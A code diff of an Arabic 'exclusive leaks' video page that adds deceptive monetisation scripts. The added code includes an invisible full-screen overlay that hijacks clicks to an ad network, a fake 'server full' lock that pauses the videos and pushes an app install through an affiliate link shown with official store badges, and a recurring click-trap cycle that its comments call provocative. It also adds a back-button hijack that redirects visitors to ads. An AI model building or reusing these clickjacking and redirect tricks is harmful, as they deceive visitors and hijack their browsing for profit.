@@ -3,8 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>حصريات العرب | سيرفر VIP المباشر</title>
+    <title>حصريات العرب | منصة المشاهدة المباشرة</title>
     
+    <meta content="summary_large_image" name="twitter:card"></meta>
+    <meta content="@AlianAlion" name="twitter:site"></meta>
+    <meta content="*" name="twitter:title"></meta>
+    <meta content="مشاهدة حصرية - حصريات العرب" name="twitter:description"></meta>
+    <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxTd6VTp-gabKWvZoKBdDQNnK1hLoFuQ1f8yUGgKJicI7ol5OOuZgKjNY00KSX_U8Z_S7f3BpR4Y78Mmx8IVyHRinmyg_11r495BaQY4bFzF9pNQAxL5_5aBuCMW4lyrtTuMfCOeNpvKzAqCwIY66hmbSPzYoUyjLbHC78MI1EHmOSHjVfgu8XtdMGfDls/s1149/1000204054.jpg" name="twitter:image"></meta>
+
     <style>
         body {
             background-color: #000;
@@ -13,6 +19,44 @@
             margin: 0;
             padding: 0;
             text-align: center;
+            overflow-x: hidden;
+        }
+
+        /* الستارة الشفافة (Adsterra) */
+        #invisible-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 9999;
+            cursor: pointer;
+            display: none; /* مخفية في البداية */
+        }
+
+        /* قفل السيرفر (SnapCash) */
+        #app-lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.96);
+            z-index: 10001;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(15px);
+        }
+
+        .lock-card {
+            background: #111;
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid #333;
+            max-width: 85%;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
         }
 
         .main-container {
@@ -21,182 +65,125 @@
             padding: 10px;
         }
 
-        header {
-            padding: 15px;
-            border-bottom: 1px solid #222;
-        }
+        header { padding: 15px; border-bottom: 1px solid #222; margin-bottom: 15px; }
+        .logo { font-size: 1.8rem; font-weight: 900; color: #ff0000; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
+        .video-card { background: #111; border-radius: 12px; overflow: hidden; border: 1px solid #333; margin-bottom: 25px; }
+        .video-title { padding: 10px; font-size: 0.9rem; color: #ffcc00; text-align: right; background: #161616; }
+        .hero-video { aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; background: #000; }
+        video { width: 100%; height: 100%; }
 
-        .logo {
-            font-size: 1.8rem;
+        .btn-install {
+            background: #00E676;
+            color: #000;
+            text-decoration: none;
+            padding: 18px;
+            display: block;
+            border-radius: 50px;
             font-weight: 900;
-            color: #ff0000;
-            margin: 0;
-        }
-
-        .video-card {
-            background: #111;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #333;
-            margin-bottom: 20px;
-        }
-
-        .video-title {
-            padding: 10px;
-            font-size: 0.9rem;
-            color: #ffcc00;
-            text-align: right;
-            background: #161616;
-        }
-
-        .hero-video {
-            aspect-ratio: 16 / 9; 
-            background: #000;
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-        }
-
-        /* نافذة القفل الذكي */
-        #app-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 10001;
-            display: none; /* تظهر برمجياً */
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .modal-content {
-            background: #1a1a1a;
-            padding: 30px 20px;
-            border-radius: 20px;
-            max-width: 85%;
-            border: 1px solid #333;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
-        }
-
-        .server-status {
-            color: #ff4444;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            margin-bottom: 15px;
-        }
-
-        .btn-store {
-            display: block;
-            margin: 15px 0;
-            transition: transform 0.2s;
-        }
-
-        .btn-store:active { transform: scale(0.95); }
-
-        .direct-link {
-            color: #888;
-            font-size: 0.7rem;
-            text-decoration: underline;
+            font-size: 1.3rem;
             margin-top: 20px;
-            display: block;
+            animation: pulse 1.5s infinite;
         }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            70% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 15px; display: block; cursor: pointer; }
     </style>
 </head>
 <body>
 
+<div id="invisible-overlay" onclick="handleAdClick()"></div>
+
+<div id="app-lock-overlay">
+    <div class="lock-card">
+        <div style="font-size: 2.5rem;">🚨</div>
+        <h2 style="color: #ffcc00;">تنبيه: السيرفر ممتلئ!</h2>
+        <p style="color: #eee; font-size: 0.95rem; line-height: 1.6;">
+            لتخفيف الضغط وضمان جودة المشاهدة 4K بدون تقطيع، يرجى المتابعة عبر التطبيق الرسمي.
+        </p>
+        <div style="margin: 15px 0;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="130">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="130">
+        </div>
+        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1PRVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==" 
+           class="btn-install">تثبيت وفتح المشاهدة فوراً</a>
+        <span class="refuse-link" onclick="handleRefusal()">المتابعة عبر المتصفح (غير مستحسن)</span>
+    </div>
+</div>
+
 <header>
     <h1 class="logo">حصريات العرب</h1>
-    <div style="color: #888; font-size: 0.7rem;">المشاهدة عبر السيرفر الاحتياطي</div>
+    <div style="color: #888; font-size: 0.8rem;">سيرفرات المشاهدة المباشرة (VIP)</div>
 </header>
 
 <div class="main-container">
     <div class="video-card">
-        <div class="video-title">🔥 الجزء الأول: التسريب الكامل</div>
+        <div class="video-title">🔥 المقطع الرئيسي: كامل وبدون حذف</div>
         <div class="hero-video">
             <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxTd6VTp-gabKWvZoKBdDQNnK1hLoFuQ1f8yUGgKJicI7ol5OOuZgKjNY00KSX_U8Z_S7f3BpR4Y78Mmx8IVyHRinmyg_11r495BaQY4bFzF9pNQAxL5_5aBuCMW4lyrtTuMfCOeNpvKzAqCwIY66hmbSPzYoUyjLbHC78MI1EHmOSHjVfgu8XtdMGfDls/s1149/1000204054.jpg">
                 <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885274047418401/VID_20260216_111844.mp4?ex=699432ce&is=6992e14e&hm=58af755808107ddd378d7532a9c0641aab818b1d9017d7f3f46aec15e2f0e673&" type="video/mp4">
             </video>
         </div>
     </div>
-
-    <div class="video-card">
-        <div class="video-title">📸 المقطع الثاني: لقطات السناب</div>
-        <div class="hero-video">
-            <video controls playsinline>
-                <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4">
-            </video>
-        </div>
-    </div>
-    
-    <p style="color: #555; font-size: 0.8rem;">يرجى الانتظار.. يتم تحميل بقية الأرشيف من السيرفر الخاص...</p>
-</div>
-
-<div id="app-overlay">
-    <div class="modal-content">
-        <div class="server-status">
-            <span style="display:inline-block; width:10px; height:100px; background:red; border-radius:50%; animation: blink 1s infinite;"></span>
-            ⚠️ تنبيه: السيرفر المباشر ممتلئ حالياً
-        </div>
-        
-        <h2 style="font-size: 1.2rem; margin-bottom: 10px;">لمتابعة المشاهدة بدون حجب</h2>
-        <p style="font-size: 0.9rem; color: #ccc; line-height: 1.6;">
-            تم نقل بقية المقاطع الحصرية إلى التطبيق الرسمي لتجنب الحظر وضمان سرعة البث. يرجى التحميل من المتجر الرسمي للمتابعة.
-        </p>
-
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..." class="btn-store">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="180" alt="Google Play">
-        </a>
-        
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..." class="btn-store">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="180" alt="App Store">
-        </a>
-
-        <div style="font-size: 0.7rem; color: #666; margin-top: 15px;">
-            نسخة التطبيق: 4.8.2 (VIP Access)
-        </div>
-        
-        <a href="https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5" class="direct-link">
-            المتابعة عبر المتصفح (غير مستقر)
-        </a>
-    </div>
+    <div class="video-card"><div class="video-title">📸 لقطات السناب</div><div class="hero-video"><video controls playsinline><source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4"></video></div></div>
 </div>
 
 <script>
-    // الرابط الخاص بك
-    const snapLink = "https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1PRVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==";
+    const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
+    const snapLink = "https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..."; // رابطك الكامل هنا
+    const overlay = document.getElementById('invisible-overlay');
+    const lock = document.getElementById('app-lock-overlay');
+    let refusalMode = false;
 
-    // تفعيل القفل بعد 90 ثانية (90000 مللي ثانية)
+    // 1. تفعيل قفل السناب كاش بعد 90 ثانية
     setTimeout(() => {
-        const overlay = document.getElementById('app-overlay');
-        overlay.style.display = 'flex';
-        // منع التمرير في الخلفية
-        document.body.style.overflow = 'hidden';
+        lock.style.display = 'flex';
+        document.querySelectorAll('video').forEach(v => v.pause());
     }, 90000);
 
-    // توجيه الروابط
-    document.querySelectorAll('.btn-store').forEach(btn => {
-        btn.onclick = (e) => {
-            e.preventDefault();
-            window.open(snapLink, '_blank');
-        };
-    });
+    // 2. التعامل مع الرفض (إرسال لـ Adsterra ثم تفعيل النهج القديم المستفز)
+    function handleRefusal() {
+        window.open(adsLink, '_blank');
+        lock.style.display = 'none';
+        refusalMode = true;
+        activateAggressiveAds(); // تفعيل الستارة المستفزة
+    }
 
-    // مانع الخروج الذكي
+    // 3. نظام الستارة المستفزة (كل 3-6 ثوان تظهر لمدة 8-12 ثانية)
+    function activateAggressiveAds() {
+        function showCycle() {
+            if(!refusalMode) return;
+            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
+            const openDuration = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000;
+
+            setTimeout(() => {
+                overlay.style.display = 'block';
+                console.log("Adsterra Active");
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    showCycle(); // تكرار الدورة
+                }, openDuration);
+            }, waitTime);
+        }
+        showCycle();
+    }
+
+    function handleAdClick() {
+        window.open(adsLink, '_blank');
+        overlay.style.display = 'none';
+    }
+
+    // 4. مانع الخروج الذكي (يحول لـ Adsterra ثم يرجع للموقع)
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
         window.onpopstate = function() {
-            window.location.replace("https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5");
+            window.location.replace(adsLink);
         };
     })();
 </script>
-
 </body>
 </html>
